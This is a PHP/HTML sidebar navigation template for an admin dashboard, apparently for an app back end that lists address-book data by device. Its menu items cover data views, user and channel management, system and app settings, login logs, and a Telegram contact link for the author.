<div class="sidebar-wrapper" data-simplebar="true">
	<div class="sidebar-header">
		<div>
			<!--<img src="static/new-Ron820/picture/logo-icon.png" class="logo-icon" alt="logo icon">-->
		</div>
		<div>
			<h5 class="logo-text"><?php echo GetValue('system.sitename',"1=1"); ?></h5>
		</div>
		<div class="toggle-icon ms-auto"><i class='bx bx-arrow-to-left'></i>
		</div>
	</div>
	<!--navigation-->
	<ul class="metismenu" id="menu">
	    
	    <li>
			<a href="/">
			    <div class="parent-icon"><i class='bx bx-home-circle'></i>
				</div>
				<div class="menu-title">首页</div>
			</a>
		</li>
		<li>
			<a href="javascript:;" class="has-arrow">
				<div class="parent-icon"><i class='bx bx-message-square-edit'></i>
				</div>
				<div class="menu-title">数据中心</div>
			</a>
			<ul>
				<li> <a href="sblist.php"><i class="bx bx-right-arrow-alt"></i>按设备列表查看</a>
				</li>
				<li> <a href="alllist.php"><i class="bx bx-right-arrow-alt"></i>查看全部通讯录</a>
				</li>
				</li>
			</ul>
		</li>
		<li>
			<a href="javascript:;" class="has-arrow">
				<div class="parent-icon"><i class="bx bx-category"></i>
				</div>
				<div class="menu-title">账号管理</div>
			</a>
			<ul>
			     <?php 
                	$uid=$_SESSION['adminuser']['id'];
                	if($uid == 0){
                	    echo '<li> <a href="adminlist.php"><i class="bx bx-right-arrow-alt"></i>用户管理</a></li>';
                	}
                	?>
				<li> <a href="qudaolist.php"><i class="bx bx-right-arrow-alt"></i>渠道管理</a>
				</li>
			</ul>
		</li>
		<?php 
        	$uid=$_SESSION['adminuser']['id'];
        	if($uid == 0){
        	    echo '
        	    <li>
        			<a class="has-arrow" href="javascript:;">
        				<div class="parent-icon"><i class="bx bx-menu"></i>
        				</div>
        				<div class="menu-title">系统设置</div>
        			</a>
        			<ul>
        			    <li> <a href="system.php"><i class="bx bx-right-arrow-alt"></i>系统配置</a>
        				</li>
        				<li> <a href="appsite.php"><i class="bx bx-right-arrow-alt"></i>APP参数配置</a>
        				</li>
        				<li> <a href="log.php"><i class="bx bx-right-arrow-alt"></i>登录日志</a>
        				</li>
        			</ul>  
        		</li>
        	    ';
        	}
        	?>
		<li>
			<a href="https://t.me/Ron820" target="_blank">
				<div class="parent-icon"><i class="bx bx-folder"></i>
				</div>
				<div class="menu-title">联系作者</div>
			</a>
		</li>
	</ul>
	<!--end navigation-->
</div>